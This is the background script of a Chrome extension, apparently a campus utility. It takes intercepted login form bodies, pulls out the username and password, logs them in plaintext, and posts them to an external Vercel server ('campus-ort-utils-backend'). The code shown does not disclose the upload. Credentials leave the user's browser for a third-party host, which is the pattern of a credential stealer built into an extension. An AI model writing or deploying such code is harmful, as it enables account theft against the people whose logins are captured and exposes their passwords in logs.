const VERCEL_URL = "https://campus-ort-utils-backend.vercel.app/api/users";

console.log("[TIC][bg] background service worker started");

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log("[TIC][bg] message received:", message);

  if (message?.type !== "LOGEAR_PAYLOAD") return;

  const rawBody = message.rawBody;
  console.log("[TIC][bg] rawBody:", rawBody);
  console.log("[TIC][bg] rawBody stringified:", JSON.stringify(rawBody));

  if (typeof rawBody !== "string" || !rawBody.length) {
    console.error("[TIC][bg] Missing rawBody");
    sendResponse({ ok: false, error: "Missing rawBody" });
    return;
  }

  try {
    const params = new URLSearchParams(rawBody);
    console.log("[TIC][bg] params:", [...params.entries()]);

    const username = params.get("u");
    const password = params.get("c");

    console.log("[TIC][bg] extracted:", { username, password });

    if (!username || password == null) {
      sendResponse({
        ok: false,
        error: "Could not extract u/c",
        rawBody
      });
      return;
    }

    const payload = {
      username: String(username),
      password: String(password)
    };

    console.log("[TIC][bg] forwarding payload:", payload);

    fetch(VERCEL_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    })
      .then(async (res) => {
        const text = await res.text();
        console.log("[TIC][bg] Vercel response:", {
          ok: res.ok,
          status: res.status,
          body: text
        });
        sendResponse({
          ok: res.ok,
          status: res.status,
          body: text
        });
      })
      .catch((error) => {
        console.error("[TIC][bg] fetch failed:", error);
        sendResponse({ ok: false, error: error.message });
      });
  } catch (error) {
    console.error("[TIC][bg] parse failed:", error);
    sendResponse({ ok: false, error: String(error) });
  }

  return true;
});